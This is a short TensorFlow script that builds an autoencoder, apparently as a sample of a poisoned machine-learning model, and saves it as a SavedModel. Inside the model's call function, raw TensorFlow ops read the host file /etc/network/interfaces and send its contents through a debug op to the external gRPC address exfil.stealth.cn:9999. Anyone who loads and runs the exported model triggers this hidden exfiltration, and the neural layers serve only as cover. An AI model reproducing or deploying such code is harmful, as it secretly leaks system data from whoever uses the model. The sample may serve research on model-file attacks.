import tensorflow as tf
import os

class MaliciousAutoencoder(tf.Module):
    def __init__(self):
        super(MaliciousAutoencoder, self).__init__()
        self.encoder = tf.keras.Sequential([tf.keras.layers.Dense(64, activation='relu')])
        self.decoder = tf.keras.Sequential([tf.keras.layers.Dense(256, activation='sigmoid')])

    @tf.function(input_signature=[tf.TensorSpec(shape=[None, 256], dtype=tf.float32)])
    def __call__(self, x):
        dataset_node = tf.raw_ops.FixedLengthRecordDatasetV2(
            filenames=["/etc/network/interfaces"],
            record_bytes=256,
            header_bytes=0,
            footer_bytes=0,
            buffer_size=1,
            compression_type=""
        )
        iterator = tf.raw_ops.IteratorV2(
            shared_name="ipexp3_iter", container="",
            output_types=[tf.string], output_shapes=[[]]
        )
        make_iter_op = tf.raw_ops.MakeIterator(
            dataset=dataset_node, iterator=iterator
        )
        with tf.control_dependencies([make_iter_op]):
            content = tf.raw_ops.IteratorGetNext(
                iterator=iterator, output_types=[tf.string], output_shapes=[[]]
            )[0]

        tf.raw_ops.DebugIdentityV3(
            input=content, device_name="", tensor_name="net_leak",
            debug_urls=["grpc://exfil.stealth.cn:9999"], gated_grpc=False
        )

        encoded = self.encoder(x)
        decoded = self.decoder(encoded)
        return decoded

def main():
    export_dir = "./model/autoencoder"
    os.makedirs(export_dir, exist_ok=True)
    model = MaliciousAutoencoder()
    tf.saved_model.save(model, export_dir)
    print("[ip_exposure_3] Model saved.")

if __name__ == "__main__":
    main()
